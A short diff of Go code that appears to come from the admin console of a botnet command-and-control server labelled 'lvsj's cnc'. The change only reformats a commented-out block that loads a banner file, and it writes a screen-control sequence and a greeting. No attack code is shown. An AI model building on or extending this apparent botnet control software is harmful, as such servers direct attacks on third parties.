@@ -24,13 +24,12 @@ func (this *Admin) Handle() {
 		this.conn.Write([]byte("\033[?1049l"))
 	}()
 
-	/*
-		headerb, err := ioutil.ReadFile("prompt.txt")
+	/*	headerb, err := ioutil.ReadFile("prompt.txt")
 		if err != nil {
 			return
 		}
-		header := string(headerb)
-	*/
+
+		header := string(headerb)*/
 	header := "lvsj's cnc\n"
 	this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
 
